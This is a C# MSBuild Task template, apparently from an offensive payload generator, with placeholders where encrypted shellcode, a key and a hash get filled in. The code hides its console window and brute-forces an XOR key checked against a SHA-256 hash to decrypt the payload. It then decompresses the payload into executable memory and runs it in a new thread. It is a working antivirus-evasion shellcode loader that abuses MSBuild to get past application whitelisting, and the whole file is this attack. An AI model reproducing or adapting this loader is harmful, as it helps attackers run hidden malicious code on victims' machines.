using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using Microsoft.CSharp;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Security.Cryptography;
public class ClassRunner : Task, ITask
{
    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    public override bool Execute()
    {
        IntPtr handle=GetConsoleWindow();
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        ShowWindow(handle, SW_HIDE);

        byte[] encShellcode = { {{.Payload}} };
        byte[] rawShellcode = { };
        byte[] key = { {{.Key}} };
        byte[] realHash = { {{.Hash}} };

        bool found = false;
        while (!found) {
            key = increase(key, 1);
            rawShellcode = xor(encShellcode, key);
            SHA256 sha256Hash = SHA256.Create();
            byte[] testHash = sha256Hash.ComputeHash(rawShellcode);
            found = compare(realHash, testHash);
        }

        rawShellcode = Gzip.Decompress(rawShellcode);

        IntPtr scAddress = VirtualAlloc(IntPtr.Zero, (UInt32)rawShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(rawShellcode , 0, (IntPtr)(scAddress), rawShellcode.Length);
        IntPtr hThread = IntPtr.Zero, threadId = IntPtr.Zero, pinfo = IntPtr.Zero;
        hThread = CreateThread(IntPtr.Zero, 0, scAddress, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
        return true;
    }

    static byte[] xor(byte[] data, byte[] key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; ++i)
        {
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return result;
    }

    static byte[] increase(byte[] Counter, int Count)
    {
        int carry = 0;
        byte[] buffer = new byte[Counter.Length];
        int offset = buffer.Length - 1;
        byte[] cnt = BitConverter.GetBytes(Count);
        byte osrc, odst, ndst;
    
        Buffer.BlockCopy(Counter, 0, buffer, 0, Counter.Length);
    
        for (int i = offset; i > 0; i--)
        {
            odst = buffer[i];
            osrc = offset - i < cnt.Length ? cnt[offset - i] : (byte)0;
            ndst = (byte)(odst + osrc + carry);
            carry = ndst < odst ? 1 : 0;
            buffer[i] = ndst;
        }
    
        return buffer;
    }

    static bool compare(byte[] a1, byte[] a2)
    {
        if (a1.Length != a2.Length) {
            return false;
        }
            
        for (int i=0; i<a1.Length; i++) {
            if (a1[i] != a2[i]) {
                return false;
            }
        }

        return true;
    }



    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref IntPtr lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("User32")]
    private static extern int ShowWindow(IntPtr hwnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();
}

public static class Extensions
{
    public static T[] SubArray<T>(this T[] array, int offset, int length)
    {
        T[] result = new T[length];
        Array.Copy(array, offset, result, 0, length);
        return result;
    }
}
class Crypto
{
    public static byte[] Decrypt(byte[] data, byte[] key)
    {
        using (var aes = Aes.Create())
        {
            aes.KeySize = 128;
            aes.BlockSize = 128;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = key;
            aes.IV = key.SubArray(0, 16);

            using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            {
                return PerformCryptography(data, decryptor);
            }
        }
    }
    private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
    {
        using (var ms = new MemoryStream())
        using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
            cryptoStream.FlushFinalBlock();

            return ms.ToArray();
        }
    }
}
class Gzip
{
    public static byte[] Decompress(byte[] inputBytes)
    {
        try
        {
            using (var inputStream = new MemoryStream(inputBytes))
            using (var gZipStream = new GZipStream(inputStream, CompressionMode.Decompress))
            using (var outputStream = new MemoryStream())
            {
                gZipStream.CopyTo(outputStream);
                return outputStream.ToArray();
            }
        }
        catch
        {
            return null;
        }
    }
}